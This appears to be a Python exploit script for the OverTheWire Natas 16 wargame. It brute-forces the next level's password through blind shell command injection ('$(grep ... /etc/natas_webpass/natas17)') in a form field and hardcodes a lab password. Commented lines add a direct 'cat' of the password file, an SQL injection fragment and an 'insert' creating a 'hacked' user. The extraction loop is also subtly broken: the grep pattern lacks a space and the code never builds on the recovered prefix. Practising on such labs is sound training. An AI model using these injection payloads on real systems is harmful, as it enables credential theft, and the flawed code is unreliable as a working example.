#!  usr/bin/env python3
import requests
import urllib
import base64
import re
from string import *
chars = lowercase + uppercase + digits


username="natas16"
password="WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
url = "http://%s.natas.labs.overthewire.org/" % username
session = requests.Session()
# files = {'uploadedfile' : ('file.jpg' , open('/home/tw3/Desktop/overthewire/natas/source_second_natas12.php.jpg','rb'))}
# response = session.post(url , data={"needle": "natas $(cat /etc/natas_webpass/natas17)"},auth = (username , password) )
# response = session.post(url , data={"needle": "natas $(cat /etc/)#"},auth = (username , password) )
# print response.text


# s=  "natas16\"\";$res=mysql_query($query, $link);echo $res;///"
# s=  "natas16"

passwd= "";
yes= False;
i = 0 
while True:
	for c in chars:
		response = session.post(url , data={"needle": "anythings$(grep ^"+c+ "cat /etc/natas_webpass/natas17)"},auth = (username , password) ) 
		# print response.text
		# if(i==5):
			# break
		if ( not re.search("anythings" ,response.text )):
			passwd+=c
			yes = True
			print (passwd )
		i+=1
	if(yes == False):
		break
	else: 
		yes= False


print (passwd)


# print	 urllib.unquote(session.cookies["data"])
# print (response.text)
# insert into users (username , password) values('hacked' , 'hacked');